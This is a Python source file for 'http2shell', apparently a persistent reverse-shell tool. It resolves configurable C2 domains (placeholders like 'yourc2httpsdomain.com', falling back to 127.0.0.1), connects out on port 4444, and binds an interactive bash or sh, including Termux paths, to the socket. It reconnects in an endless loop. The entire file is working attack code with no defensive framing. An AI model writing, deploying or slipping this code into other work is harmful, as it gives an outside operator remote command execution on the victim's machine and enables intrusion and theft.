#!/usr/bin/python3
import os
import socket
import subprocess
from sys import stdout, exit
from time import sleep

c2httpsdomain   = "yourc2httpsdomain.com"
c2httpdomain    = "yourc2httpdomain.com"
c2defaultdomain = "127.0.0.1"
port = 4444

reset = "\033[0m"
red = "\033[31m"
darkgreen = "\033[38;5;22m"
orange = "\033[38;5;208m"
cyan = "\033[36m"
white = "\033[37m"
bold = "\033[1m"
dim = "\033[2m"
italic = "\033[3m"

banner = f"""
{bold}
{orange}    __    __  __       {red} ___{orange}        __         ____
{orange}   / /_  / /_/ /_____ {red} |__ \\{orange} _____/ /_  ___  / / /
{orange}  / __ \\/ __/ __/ __ \\{red} __/ /{orange}/ ___/ __ \\/ _ \\/ / /
{orange} / / / / /_/ /_/ /_/ /{red}/___/{orange}(__  ) / / /  __/ / /
{orange}/_/ /_/\\__/\\__/ .___/{red}/____/{orange}____/_/ /_/\\___/_/_/
{orange}             /_/
{bold}{red}  + {dim}{white}{italic}http2shell{reset}
{bold}{red}  + {dim}{white}{italic}author: tom7{reset}
{bold}{red}  + {dim}{white}{italic}github: https://github.com/tom7voldemort{reset}
{bold}{red}  + {dim}{white}{italic}version: 1.3{reset}
{reset}
"""

class strobj:
    def clear():
        os.system("clear")

    def typewrite(msg, delay=0.01):
        for ch in msg:
            stdout.write(ch)
            stdout.flush()
            sleep(delay)
        print()

    def info(msg):
        strobj.typewrite(f"{bold}{dim}{white}[{darkgreen}info +{white}] {msg}{reset}")

    def warnings(msg):
        strobj.typewrite(f"{bold}{dim}{white}[{orange}warn !{white}] {msg}{reset}")

    def errors(msg):
        strobj.typewrite(f"{bold}{dim}{white}[{red}error x{white}] {msg}{reset}")


class inet:
    def resolve():
        for Domain in [c2httpsdomain, c2httpdomain, c2defaultdomain]:
            try:
                ip = socket.gethostbyname(Domain)
                strobj.info(f"resolved {Domain} -> {ip}")
                return ip
            except Exception:
                continue
        return None

    def spawn(ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
        except Exception as e:
            strobj.warnings(f"connection failed: {e}")
            return False
        strobj.info(f"connected to {ip}:{port}")
        shell = "bash"
        for sh in ["/data/data/com.termux/files/usr/bin/bash", "/bin/bash", "/usr/bin/bash", "/bin/sh"]:
            if os.path.exists(sh):
                shell = sh
                break
        strobj.info(f"spawning shell: {shell}")
        try:
            fd = s.fileno()
            proc = subprocess.Popen(
                [shell, "-i"],
                stdin=fd,
                stdout=fd,
                stderr=fd,
                close_fds=True
            )
            proc.wait()
            return True
        except Exception as e:
            strobj.warnings(f"shell exit: {e}")
            return False
        finally:
            try:
                s.close()
            except Exception:
                pass


def exploit():
    while True:
        try:
            ip = inet.resolve()
            if not ip:
                strobj.errors("no server active. retrying...")
                sleep(3)
                continue
            strobj.info(f"target server: {ip}:{port}")
            strobj.info("starting shell session...")
            ok = inet.spawn(ip, port)
            if ok:
                strobj.info("shell session ended. reconnecting...")
            else:
                strobj.warnings("bad connection. retrying...")
            sleep(0.5)
        except KeyboardInterrupt:
            strobj.info("stopped.")
            exit(0)
        except Exception:
            sleep(0.5)


if __name__ == "__main__":
    strobj.clear()
    print(banner)
    exploit()
